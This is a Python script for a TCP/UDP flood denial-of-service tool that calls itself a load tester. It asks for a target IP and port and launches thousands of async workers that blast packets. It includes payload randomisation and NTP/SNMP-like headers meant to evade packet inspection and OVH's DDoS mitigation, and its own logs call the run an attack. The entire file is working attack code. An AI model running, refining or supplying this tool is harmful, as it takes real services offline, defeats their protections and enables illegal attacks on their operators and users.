import asyncio
import random
import socket
import logging
import sys

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def generate_smart_payload(size):
    # Differentiating the header so the packet resembles NTP/SNMP
    header = b'\x17\x00\x03\x2a' + b'\x00' * 4
    if size <= len(header):
        return header[:size]
    return header + random.randbytes(size - len(header))

async def tcp_flood_worker(target_ip, target_port, payload, semaphore, worker_id):
	while True:
		try:
			async with semaphore:
				reader, writer = await asyncio.open_connection(target_ip, target_port)
				try:
					# Blast the payload continuously
					for _ in range(100):
						writer.write(payload)
						await writer.drain()
						
					# Log occasionally
					if random.random() < 0.01:
						logging.info(f"[L4 TCP] Worker {worker_id} successfully blasted {len(payload)*100} bytes.")
				except Exception:
					pass
				finally:
					writer.close()
					await writer.wait_closed()
		except asyncio.CancelledError:
			break
		except Exception:
			await asyncio.sleep(0.01)

async def udp_flood_worker(target_ip, target_port, payload, semaphore, worker_id):
	# Создаем ОДИН сокет на воркер вне цикла, чтобы не нагружать ОС
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	# Убираем неблокирующий режим для сырой скорости, Python будет использовать системный TCP/UDP буфер
	while True:
		try:
			# Огромный бёрст напрямую в ОС без asyncio.sleep между пакетами
			for _ in range(5000):
				# Генерация динамического мусора на лету, чтобы пробить базовые сигнатуры OVH VAC
				dynamic_payload = payload[:10] + random.randbytes(len(payload)-10)
				sock.sendto(dynamic_payload, (target_ip, target_port))
				
			if random.random() < 0.05:
				logging.info(f"[L4 UDP] Worker {worker_id} successfully sent massive burst.")
				
			# Возвращаем контроль event_loop на мгновение
			await asyncio.sleep(0)  
		except asyncio.CancelledError:
			break
		except Exception:
			await asyncio.sleep(0.001)

async def main():
	print("--- Layer 4 Load Tester (Hibernet-Level Power) ---")
	target_ip = input("Insert Target IP (e.g. 45.139.132.87): ").strip()
	target_port = int(input("Insert Target Port (e.g. 80): ").strip())
	method = input("Select Method (TCP/UDP): ").strip().upper()
	threads = int(input("Insert number of async workers (e.g. 5000): ").strip())
	packet_size = int(input("Insert Payload Size in bytes (default 1024): ") or "1024")
	
	# Generate smart payload to bypass simple packet inspection
	payload = generate_smart_payload(packet_size)
	
	# Massive concurrency limit for L4 (OS network stack limit)
	conn_limit = min(threads, 20000)
	semaphore = asyncio.Semaphore(conn_limit)
	
	tasks = []
	logging.info(f"Starting L4 {method} attack on {target_ip}:{target_port} with {threads} workers...")
	
	for x in range(threads):
		if method == 'UDP':
			tasks.append(asyncio.create_task(udp_flood_worker(target_ip, target_port, payload, semaphore, x+1)))
		else:
			tasks.append(asyncio.create_task(tcp_flood_worker(target_ip, target_port, payload, semaphore, x+1)))
			
	try:
		await asyncio.gather(*tasks)
	except asyncio.CancelledError:
		logging.info("Attack successfully cancelled.")

if __name__ == '__main__':
	try:
		if sys.platform == 'win32':
			asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
		asyncio.run(main())
	except KeyboardInterrupt:
		print("\nStopped by user.")
		sys.exit(0)